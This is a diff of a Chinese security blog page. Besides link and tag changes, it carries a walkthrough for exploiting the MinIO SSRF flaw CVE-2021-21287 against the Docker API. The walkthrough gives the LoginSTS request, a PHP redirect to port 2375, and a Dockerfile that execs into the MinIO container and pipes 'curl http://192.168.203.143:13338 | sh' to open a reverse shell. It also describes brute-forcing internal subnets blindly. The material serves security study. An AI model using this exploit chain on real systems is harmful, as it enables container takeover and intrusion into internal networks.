@@ -8,28 +8,28 @@
   <link rel="dns-prefetch" href="https://laohuan12138.github.io">
   <title>Minio-ssrf盲打 | Laohuan&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="文章首发于火线安全 地址https:&#x2F;&#x2F;zone.huoxian.cn&#x2F;d&#x2F;2801-minio-ssrf-docker-api 前言Minio SSRF漏洞-CVE-2021-21287，由于MinIO组件中LoginSTS接口设计不当，导致存在服务器端请求伪造漏洞。">
+  <meta name="description" content="文章首发于火线安全 地址http:&#x2F;&#x2F;zone.huoxian.cn&#x2F;d&#x2F;2801-minio-ssrf-docker-api 前言Minio SSRF漏洞-CVE-2021-21287，由于MinIO组件中LoginSTS接口设计不当，导致存在服务器端请求伪造漏洞。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Minio-ssrf盲打">
 <meta property="og:url" content="https://laohuan12138.github.io/2023/07/14/Minio-ssrf%E7%9B%B2%E6%89%93/index.html">
 <meta property="og:site_name" content="Laohuan&#39;s Blog">
-<meta property="og:description" content="文章首发于火线安全 地址https:&#x2F;&#x2F;zone.huoxian.cn&#x2F;d&#x2F;2801-minio-ssrf-docker-api 前言Minio SSRF漏洞-CVE-2021-21287，由于MinIO组件中LoginSTS接口设计不当，导致存在服务器端请求伪造漏洞。">
+<meta property="og:description" content="文章首发于火线安全 地址http:&#x2F;&#x2F;zone.huoxian.cn&#x2F;d&#x2F;2801-minio-ssrf-docker-api 前言Minio SSRF漏洞-CVE-2021-21287，由于MinIO组件中LoginSTS接口设计不当，导致存在服务器端请求伪造漏洞。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2023-05-14_23-07-35.png">
-<meta property="og:image" content="https://cdn.laohuan.art/minio.png">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2023-05-14_23-11-36-1684572404927-7.png">
-<meta property="og:image" content="https://cdn.laohuan.art/image-20230520171912576.png">
-<meta property="og:image" content="https://cdn.laohuan.art/image-20230520172114318.png">
-<meta property="og:image" content="https://cdn.laohuan.art/image-20230520172310029.png">
-<meta property="og:image" content="https://cdn.laohuan.art/image-20230520172439983.png">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2023-05-14_22-08-01.png">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2023-05-14_22-07-26.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2023-05-14_23-07-35.png">
+<meta property="og:image" content="http://qn.laohuan.xin/minio.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2023-05-14_23-11-36-1684572404927-7.png">
+<meta property="og:image" content="http://qn.laohuan.xin/image-20230520171912576.png">
+<meta property="og:image" content="http://qn.laohuan.xin/image-20230520172114318.png">
+<meta property="og:image" content="http://qn.laohuan.xin/image-20230520172310029.png">
+<meta property="og:image" content="http://qn.laohuan.xin/image-20230520172439983.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2023-05-14_22-08-01.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2023-05-14_22-07-26.png">
 <meta property="article:published_time" content="2023-07-14T06:45:47.000Z">
-<meta property="article:modified_time" content="2023-07-14T07:16:24.222Z">
+<meta property="article:modified_time" content="2025-01-06T09:35:35.115Z">
 <meta property="article:author" content="Laohuan">
 <meta property="article:tag" content="SSRF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.laohuan.art/Snipaste_2023-05-14_23-07-35.png">
+<meta name="twitter:image" content="http://qn.laohuan.xin/Snipaste_2023-05-14_23-07-35.png">
   
     <link rel="alternative" href="/atom.xml" title="Laohuan&#39;s Blog" type="application/atom+xml">
   
@@ -47,7 +47,7 @@
 
   
 
-<meta name="generator" content="Hexo 4.2.0"></head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body>
   <div id="container" q-class="show:isCtnShow">
@@ -274,7 +274,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p><strong>文章首发于火线安全</strong></p>
-<p>地址<a href="https://zone.huoxian.cn/d/2801-minio-ssrf-docker-api" target="_blank" rel="noopener">https://zone.huoxian.cn/d/2801-minio-ssrf-docker-api</a></p>
+<p>地址<a href="http://zone.huoxian.cn/d/2801-minio-ssrf-docker-api" target="_blank" rel="noopener">http://zone.huoxian.cn/d/2801-minio-ssrf-docker-api</a></p>
 <h2><span id="前言">前言</span></h2><p>Minio SSRF漏洞-<strong>CVE-2021-21287</strong>，由于MinIO组件中LoginSTS接口设计不当，导致存在服务器端请求伪造漏洞。</p>
 <a id="more"></a>
 
@@ -298,10 +298,10 @@
 <p>发送数据包</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/minio/webrpc</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.203.130</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 76</span><br><span class="line"></span><br><span class="line">&#123;"id":1,"jsonrpc":"2.0","params":&#123;"token":"Test"&#125;,"method":"web.LoginSTS"&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.laohuan.art/Snipaste_2023-05-14_23-07-35.png" alt="Snipaste_2023-05-14_23-07-35"></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2023-05-14_23-07-35.png" alt="Snipaste_2023-05-14_23-07-35"></p>
 <p>可以看到我们的8080端口确实收到了请求</p>
 <p>利用过程如图</p>
-<p><img src="https://cdn.laohuan.art/minio.png" alt="minio"></p>
+<p><img src="http://qn.laohuan.xin/minio.png" alt="minio"></p>
 <p>这里黑客指定地址如上面的代码，也就是<a href="http://192.168.203.130:8080，假如我们把这个地址换为其他地址呢，比如docker">http://192.168.203.130:8080，假如我们把这个地址换为其他地址呢，比如docker</a> api或者内网其他服务的地址。</p>
 <p>现在尝试攻击docker api的2375端口</p>
 <p>在黑客服务器上编辑index.php文件,内容如下</p>
@@ -322,7 +322,7 @@ header(&#39;Location: http://192.168.203.130:2375/build?remote=http://192.168.20
 <p>再次发送数据包</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/minio/webrpc</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x #黑客地址</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 76</span><br><span class="line"></span><br><span class="line">&#123;"id":1,"jsonrpc":"2.0","params":&#123;"token":"Test"&#125;,"method":"web.LoginSTS"&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.laohuan.art/Snipaste_2023-05-14_23-11-36-1684572404927-7.png" alt="Snipaste_2023-05-14_23-11-36"></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2023-05-14_23-11-36-1684572404927-7.png" alt="Snipaste_2023-05-14_23-11-36"></p>
 <p>可以看到，已经成功的请求了我们的恶意dockerfile文件，并获得了一个shell</p>
 <h2><span id="自动化盲打">自动化盲打</span></h2><p>那么问题来了，这里作为测试我们知道docker api的地址为192.168.203.130，在实际环境中我们是不知道docker集群的api地址的，甚至连有没有docker集群都不一定，这个时候就只能盲打碰碰运气了</p>
 <p>难点在于要利用这个漏洞不断地向我们的服务器获取重定向的地址，服务器端要不断的刷新这个重定向的地址。</p>
@@ -345,36 +345,36 @@ header(&#39;Location: http://192.168.203.130:2375/build?remote=http://192.168.20
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">FROM alpine:3.13</span><br><span class="line"></span><br><span class="line">RUN apk add curl bash jq</span><br><span class="line"></span><br><span class="line">RUN <span class="built_in">set</span> -ex &amp;&amp; \</span><br><span class="line">&#123; \</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'#!/bin/bash'</span>; \</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'set -ex'</span>; \</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'target="http://192.168.203.143:2375"'</span>; \</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'jsons=$(curl -s -XGET "$&#123;target&#125;/containers/json" | jq -r ".[] | @base64")'</span>; \</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'for item in $&#123;jsons[@]&#125;; do'</span>; \</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'    name=$(echo $item | base64 -d | jq -r ".Image")'</span>; \</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'    if [[ "$name" == *"minio/minio"* ]]; then'</span>; \</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'        id=$(echo $item | base64 -d | jq -r ".Id")'</span>; \</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'        break'</span>; \</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'    fi'</span>; \</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'done'</span>; \</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'execid=$(curl -s -X POST "$&#123;target&#125;/containers/$&#123;id&#125;/exec" -H "Content-Type: application/json" --data-binary "&#123;\"Cmd\": [\"bash\", \"-c\", \"curl http://192.168.203.143:13338 | sh\"]&#125;" | jq -r ".Id")'</span>; \</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'curl -s -X POST "$&#123;target&#125;/exec/$&#123;execid&#125;/start" -H "Content-Type: application/json" --data-binary "&#123;&#125;"'</span>; \</span><br><span class="line">&#125; | bash</span><br></pre></td></tr></table></figure>
 
 <p>注意修改这串命令<code>curl http://192.168.203.143:13338 | sh</code></p>
-<p>这里可以使用nc的反弹命令，但nc长时间监听被别人扫描会有一些花里胡哨的东西，且nc只能管理单个shell，这里我用了一款shell管理器 <a href="https://platypus-reverse-shell.vercel.app/" target="_blank" rel="noopener">platypus</a></p>
+<p>这里可以使用nc的反弹命令，但nc长时间监听被别人扫描会有一些花里胡哨的东西，且nc只能管理单个shell，这里我用了一款shell管理器 <a href="http://platypus-reverse-shell.vercel.app/" target="_blank" rel="noopener">platypus</a></p>
 <p>启动 platypus,便会生成链接地址</p>
 <p><code>./platypus_linux_amd64</code></p>
 </li>
 </ol>
-<p><img src="https://cdn.laohuan.art/image-20230520171912576.png" alt="image-20230520171912576"></p>
+<p><img src="http://qn.laohuan.xin/image-20230520171912576.png" alt="image-20230520171912576"></p>
 <p>将生成的命令替换为dockerfile的命令即可</p>
 <ol start="3">
 <li><p>修改脚本相关注释内容即可</p>
-<p><img src="https://cdn.laohuan.art/image-20230520172114318.png" alt="image-20230520172114318"></p>
+<p><img src="http://qn.laohuan.xin/image-20230520172114318.png" alt="image-20230520172114318"></p>
 </li>
 </ol>
 <p>我只设置了爆破c段，我觉得挑几个常见的c段爆破一下碰下运气就行了，没必要弄那么大的动静把内网来一遍</p>
-<p><img src="https://cdn.laohuan.art/image-20230520172310029.png" alt="image-20230520172310029"></p>
+<p><img src="http://qn.laohuan.xin/image-20230520172310029.png" alt="image-20230520172310029"></p>
 <p>确保这个目录下存在这三个文件，开启相关服务就可以直接运行脚本了</p>
-<p><img src="https://cdn.laohuan.art/image-20230520172439983.png" alt="image-20230520172439983"></p>
+<p><img src="http://qn.laohuan.xin/image-20230520172439983.png" alt="image-20230520172439983"></p>
 <p><code>php -S 0.0.0.0:80</code></p>
 <p><code>python3 minio.py</code></p>
-<p><img src="https://cdn.laohuan.art/Snipaste_2023-05-14_22-08-01.png" alt="Snipaste_2023-05-14_22-08-01"></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2023-05-14_22-08-01.png" alt="Snipaste_2023-05-14_22-08-01"></p>
 <p>可以看到目标最终请求了我们的Dockerfile文件</p>
 <p>platypu也成功获得了一个shell</p>
-<p><img src="https://cdn.laohuan.art/Snipaste_2023-05-14_22-07-26.png" alt="Snipaste_2023-05-14_22-07-26"></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2023-05-14_22-07-26.png" alt="Snipaste_2023-05-14_22-07-26"></p>
 <p><strong>演示视频</strong></p>
-<iframe width="500" height="315" src="https://www.youtube.com/embed/wxZJwQP94ro" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+<iframe width="500" height="315" src="http://www.youtube.com/embed/wxZJwQP94ro" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
 
 <h2><span id="总结">总结</span></h2><p>当然也不只局限于用来打docker api，也可以利用常规的ssrf利用手段来盲打其他服务，改下脚本就行，另外我也只写了爆破c段，盲打这种东西本来就是靠运气的，大家也可以改改脚本来爆破b段。</p>
 <p>参考文献</p>
 <ul>
-<li><a href="https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html</a></li>
-<li><a href="https://mp.weixin.qq.com/s/0PbCSy83Sfozqq2-aUaAew" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/0PbCSy83Sfozqq2-aUaAew</a></li>
+<li><a href="http://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html" target="_blank" rel="noopener">http://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html</a></li>
+<li><a href="http://mp.weixin.qq.com/s/0PbCSy83Sfozqq2-aUaAew" target="_blank" rel="noopener">http://mp.weixin.qq.com/s/0PbCSy83Sfozqq2-aUaAew</a></li>
 </ul>
 
       
@@ -577,7 +577,7 @@ header(&#39;Location: http://192.168.203.130:2375/build?remote=http://192.168.20
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2023 Laohuan
+    		&copy; 2025 Laohuan
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -697,6 +697,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">JBoss</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CGI</a>
               </li>
              
@@ -705,7 +709,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">JBoss</a>
+                <a href="javascript:void(0)" class="js-tag color1">HTTPS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">应急响应</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">考试</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -713,7 +725,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">权限维持</a>
+                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -725,7 +737,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Samba</a>
+                <a href="javascript:void(0)" class="js-tag color5">权限维持</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -733,7 +745,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Tomcat</a>
+                <a href="javascript:void(0)" class="js-tag color1">Samba</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -741,7 +753,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Tomcat</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">Weblogic</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">工具分享</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -757,6 +777,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">靶场</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">zabbix</a>
               </li>
              
@@ -765,39 +789,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Chrome</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">靶场</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">应急响应</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">工具分享</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">考试</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">HTTPS</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">加解密</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Chrome</a>
               </li>
             
             <div class="clearfix"></div>
